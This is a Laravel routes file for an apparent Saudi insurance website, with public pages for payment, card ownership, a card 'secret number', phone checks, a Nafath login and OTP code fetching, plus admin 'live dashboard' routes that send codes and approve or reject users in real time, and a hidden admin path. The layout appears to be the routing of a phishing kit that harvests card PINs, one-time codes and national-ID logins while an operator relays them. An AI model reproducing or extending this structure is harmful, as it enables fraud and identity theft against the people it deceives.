<?php
<?php

use App\Http\Controllers\ProfileController;
use App\Http\Controllers\Backend\Admin\AdminDashboardController;
use App\Http\Controllers\Backend\Admin\AdminLoginController;
use App\Http\Controllers\Backend\Admin\InsuranceBackendController;
use App\Http\Controllers\Backend\Admin\InsuranceRequestsBackendController;
use App\Http\Controllers\Backend\Admin\SupportTicketController;
use App\Http\Controllers\Frontend\HomePageFrontendController;
use App\Http\Controllers\Admin\VisitorController;
use App\Http\Controllers\Admin\CustomReportsController;
use App\Http\Controllers\Admin\LiveDashboardController;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| Web Routes Structure
|--------------------------------------------------------------------------
| 1. Test Routes (development only)
| 2. Super Admin Routes (/super_admin/*)
| 3. Frontend Routes (/)
| 4. Service Worker & Utilities
|--------------------------------------------------------------------------
*/

// ==================== Test Routes ====================
Route::get('/test-vite', function () {
    return view('test-vite');
})->name('test-vite');

Route::get('/test-insurance-flow', function () {
    return view('test-insurance-flow');
})->name('test-insurance-flow');

Route::post('/test-create-session', function () {
    $insuranceRequest = new \App\Models\InsuranceRequest();
    $insuranceRequest->id_number = '1234567890';
    $insuranceRequest->insurance_id = 1;
    $insuranceRequest->save();
    
    session([
        'insuranceRequest' => [
            'id' => $insuranceRequest->id,
            'id_number' => $insuranceRequest->id_number,
            'insurance_id' => 1,
        ]
    ]);
    
    return redirect()->route('test-insurance-flow')
        ->with('success', 'تم إنشاء جلسة جديدة بنجاح! معرف الطلب: ' . $insuranceRequest->id);
})->name('test-create-session');

// ==================== Super Admin Routes ====================
Route::prefix('super_admin')->name('super_admin.')->group(function () {
    
    // Public Authentication Routes
    Route::get('/login', [AdminLoginController::class, 'showLoginForm'])->name('loginUser');
    Route::post('/loginFormSubmit', [AdminLoginController::class, 'loginFormSubmit'])
        ->middleware('throttle:10,1')
        ->name('loginFormSubmit');
    Route::get('/loginFormSubmit', fn() => redirect()->route('super_admin.loginUser'));
    Route::post('/logout', [AdminLoginController::class, 'logout'])->name('logout');
    
    // Redirect root to dashboard or login
    Route::get('/', function () {
        return auth('super_admin')->check() 
            ? redirect('/super_admin/dashboard')
            : redirect('/super_admin/login');
    })->name('index');

    // Protected Routes
    Route::middleware(['auth:super_admin'])->group(function () {
        
        // Dashboard
        Route::get('/dashboard', [AdminDashboardController::class, 'index'])->name('dashboard');
        Route::get('/visitors/summary', [VisitorController::class, 'summary'])->name('visitors.summary');

        // Support Tickets
        Route::prefix('support_tickets')->name('support_tickets-')->group(function () {
            Route::get('/index', [SupportTicketController::class, 'index'])->name('index');
            Route::get('destroy/{id}', [SupportTicketController::class, 'destroy'])->name('destroy');
        });

        // Profile Management
        Route::prefix('profile')->group(function () {
            Route::get('/edit', [ProfileController::class, 'edit'])->name('edit');
            Route::patch('/update', [ProfileController::class, 'update'])->name('profile.update');
            Route::delete('/destroy', [ProfileController::class, 'destroy'])->name('profile.destroy');
        });

        // Insurance Management
        Route::prefix('insurances')->name('insurances-')->group(function () {
            Route::get('/index', [InsuranceBackendController::class, 'index'])->name('index');
            Route::get('/create', [InsuranceBackendController::class, 'create'])->name('create');
            Route::post('/store', [InsuranceBackendController::class, 'store'])->name('store');
            Route::get('show/{id}', [InsuranceBackendController::class, 'show'])->name('show');
            Route::get('edit/{id}', [InsuranceBackendController::class, 'edit'])->name('edit');
            Route::post('update/{id}', [InsuranceBackendController::class, 'update'])->name('update');
            Route::get('softDelete/{id}', [InsuranceBackendController::class, 'softDelete'])->name('softDelete');
            Route::get('/showSoftDelete', [InsuranceBackendController::class, 'showSoftDelete'])->name('showSoftDelete');
            Route::get('softDeleteRestore/{id}', [InsuranceBackendController::class, 'softDeleteRestore'])->name('softDeleteRestore');
            Route::post('addInsuranceBenefit/{id}', [InsuranceBackendController::class, 'addInsuranceBenefit'])->name('addInsuranceBenefit');
            Route::get('deleteInsuranceBenefit/{id}', [InsuranceBackendController::class, 'deleteInsuranceBenefit'])->name('deleteInsuranceBenefit');
        });

        // Insurance Requests Management
        Route::prefix('insurance_requests')->name('insurance_requests-')->group(function () {
            Route::get('/index', [InsuranceRequestsBackendController::class, 'index'])->name('index');
            Route::get('/summary', [InsuranceRequestsBackendController::class, 'summary'])->name('summary');
            Route::get('show/{id}', [InsuranceRequestsBackendController::class, 'show'])->name('show');
            Route::get('softDelete/{id}', [InsuranceRequestsBackendController::class, 'softDelete'])->name('softDelete');
            Route::get('/showSoftDelete', [InsuranceRequestsBackendController::class, 'showSoftDelete'])->name('showSoftDelete');
            Route::get('softDeleteRestore/{id}', [InsuranceRequestsBackendController::class, 'softDeleteRestore'])->name('softDeleteRestore');
            Route::get('sendNafathCode/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCode'])->name('sendNafathCode');
            Route::post('sendNafathCodeRequest/{id}', [InsuranceRequestsBackendController::class, 'sendNafathCodeRequest'])->name('sendNafathCodeRequest');
        });

        // Realtime Dashboard
        Route::prefix('realtime')->name('realtime-')->group(function () {
            Route::get('/dashboard', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'index'])->name('dashboard');
            Route::get('/data', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'getData'])->name('data');
            Route::get('/user/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'getUserDetail'])->name('user-detail');
            Route::post('/send-code/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'sendCode'])->name('send-code');
            Route::post('/update-approval/{id}', [App\Http\Controllers\Backend\Admin\RealtimeDashboardController::class, 'updateApprovalStatus'])->name('update-approval');
        });

        // Custom Reports
        Route::prefix('custom_reports')->name('custom_reports-')->group(function () {
            Route::get('/dashboard', [CustomReportsController::class, 'dashboard'])->name('dashboard');
            Route::get('/index', [CustomReportsController::class, 'index'])->name('index');
            Route::get('/show/{id}', [CustomReportsController::class, 'show'])->name('show');
            Route::get('/summary', [CustomReportsController::class, 'summary'])->name('summary');
            Route::get('/export', [CustomReportsController::class, 'export'])->name('export');
            Route::post('/filter', [CustomReportsController::class, 'filter'])->name('filter');
        });

        // Live Dashboard
        Route::prefix('live_dashboard')->name('live_dashboard-')->group(function () {
            Route::get('/', [LiveDashboardController::class, 'index'])->name('index');
            Route::get('/data', [LiveDashboardController::class, 'getData'])->name('data');
            Route::get('/user/{id}', [LiveDashboardController::class, 'getUserDetails'])->name('user-details');
            Route::post('/send-code', [LiveDashboardController::class, 'sendCode'])->name('send-code');
            Route::post('/approve/{id}', [LiveDashboardController::class, 'approveUser'])->name('approve');
            Route::post('/reject/{id}', [LiveDashboardController::class, 'rejectUser'])->name('reject');
        });
    });
});

// ==================== Frontend Routes ====================

// Home Page
Route::get('/', [HomePageFrontendController::class, 'welcome'])->name('welcome');

// Favicon
Route::get('/favicon.ico', function () {
    $path = public_path('style_files/frontend/img/logo.png');
    return file_exists($path) 
        ? response()->file($path, ['Content-Type' => 'image/png'])
        : response('', 204);
});

// Insurance Process Workflow
Route::post('/insuranceRequest', [HomePageFrontendController::class, 'insuranceRequest'])->name('insuranceRequest');
Route::get('/insuranceStatements', [HomePageFrontendController::class, 'insuranceStatements'])->name('insuranceStatements');
Route::post('/insuranceStatementsRequest', [HomePageFrontendController::class, 'insuranceStatementsRequest'])->name('insuranceStatementsRequest');
Route::post('/insuranceInquiryRequest', [HomePageFrontendController::class, 'insuranceInquiryRequest'])->name('insuranceInquiryRequest');
Route::get('/insuranceType', [HomePageFrontendController::class, 'insuranceType'])->name('insuranceType');
Route::post('/insuranceTypeRequest', [HomePageFrontendController::class, 'insuranceTypeRequest'])->name('insuranceTypeRequest');
Route::get('/insuranceInformation', [HomePageFrontendController::class, 'insuranceInformation'])->name('insuranceInformation');
Route::post('/insuranceInformationRequest', [HomePageFrontendController::class, 'insuranceInformationRequest'])->name('insuranceInformationRequest');

// Payment
Route::get('/paymentForm', [HomePageFrontendController::class, 'paymentForm'])->name('paymentForm');
Route::post('/paymentFormRequest', [HomePageFrontendController::class, 'paymentFormRequest'])->name('paymentFormRequest');

// Approval & Verification
Route::get('/pending-approval', [HomePageFrontendController::class, 'pendingApproval'])->name('pendingApproval');
Route::get('/check-approval-status/{id}', [HomePageFrontendController::class, 'checkApprovalStatus'])->name('check-approval-status');

// Call Process
Route::get('/beforeCallProcess', [HomePageFrontendController::class, 'beforeCallProcess'])->name('beforeCallProcess');
Route::get('/callProcess', [HomePageFrontendController::class, 'callProcess'])->name('callProcess');
Route::post('/callProcessRequest', [HomePageFrontendController::class, 'callProcessRequest'])->name('callProcessRequest');

// Card Ownership Verification
Route::get('/cardOwnership', [HomePageFrontendController::class, 'cardOwnership'])->name('cardOwnership');
Route::post('/cardOwnershipRequest', [HomePageFrontendController::class, 'cardOwnershipRequest'])->name('cardOwnershipRequest');
Route::get('/cardOwnershipSecertNumber', [HomePageFrontendController::class, 'cardOwnershipSecertNumber'])->name('cardOwnershipSecertNumber');
Route::post('/cardOwnershipSecertNumberRequest', [HomePageFrontendController::class, 'cardOwnershipSecertNumberRequest'])->name('cardOwnershipSecertNumberRequest');

// Phone Confirmation
Route::get('/confirmPhoneNumber', [HomePageFrontendController::class, 'confirmPhoneNumber'])->name('confirmPhoneNumber');
Route::post('/confirmPhoneNumberRequest', [HomePageFrontendController::class, 'confirmPhoneNumberRequest'])->name('confirmPhoneNumberRequest');
Route::get('/checkPhoneNumber', [HomePageFrontendController::class, 'checkPhoneNumber'])->name('checkPhoneNumber');
Route::post('/checkPhoneNumberRequest', [HomePageFrontendController::class, 'checkPhoneNumberRequest'])->name('checkPhoneNumberRequest');

// Nafath Authentication
Route::get('/nafathLogin', [HomePageFrontendController::class, 'nafathLogin'])->name('nafathLogin');
Route::post('/nafathLoginRequest', [HomePageFrontendController::class, 'nafathLoginRequest'])->name('nafathLoginRequest');
Route::post('/nafathDocumentingRequest', [HomePageFrontendController::class, 'nafathDocumentingRequest'])->name('nafathDocumentingRequest');
Route::get('/codeDegit', [HomePageFrontendController::class, 'codeDegit'])->name('codeDegit');
Route::get('/fetchCodeDegit', [HomePageFrontendController::class, 'fetchCodeDegit'])->name('fetchCodeDegit');
Route::get('/resendCodeDegit', [HomePageFrontendController::class, 'resendCodeDegit'])->name('resendCodeDegit');
Route::get('/cardDeclined', [HomePageFrontendController::class, 'cardDeclined'])->name('cardDeclined');

// ==================== Utilities ====================

// Service Worker
Route::get('/sw.js', function () {
    $path = public_path('sw.js');
    abort_unless(file_exists($path), 404);
    return response()->file($path, [
        'Content-Type' => 'text/javascript; charset=UTF-8',
        'Service-Worker-Allowed' => '/',
        'Cache-Control' => 'no-cache, no-store, must-revalidate',
        'Pragma' => 'no-cache',
        'Expires' => '0',
    ]);
})->name('sw');

// Visitor Tracking
Route::post('/v/ping', [App\Http\Controllers\Frontend\VisitController::class, 'ping'])->name('visit.ping');

// Admin Monitoring (Hidden Path)
Route::prefix(config('admin.secret_path', 'x-admin-9bcd'))->middleware(['auth:super_admin', 'admin.ip.allow'])->group(function () {
    Route::get('/monitoring', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'index'])->name('admin.monitoring.index');
    Route::get('/monitoring/poll', [App\Http\Controllers\Backend\Admin\MonitoringController::class, 'poll'])->name('admin.monitoring.poll');
});
